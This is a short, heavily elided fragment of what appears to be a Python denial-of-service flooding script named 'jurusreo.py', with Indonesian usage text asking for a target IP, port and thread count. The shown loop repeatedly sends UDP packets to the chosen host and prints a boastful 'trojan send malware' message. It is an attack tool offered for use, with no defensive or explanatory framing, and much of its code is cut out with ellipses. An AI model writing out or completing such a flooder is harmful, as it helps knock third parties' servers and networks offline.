	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m-->trojan Xwne017 send 10000 malware<-- \033[0m")
			else:
				s.shutdown(1)
...
def usage():
	...
	contoh : python3 jurusreo.py -s 192.168.0.1 -p 80 -t 135	
	-h : help
	-s : alamat ip target
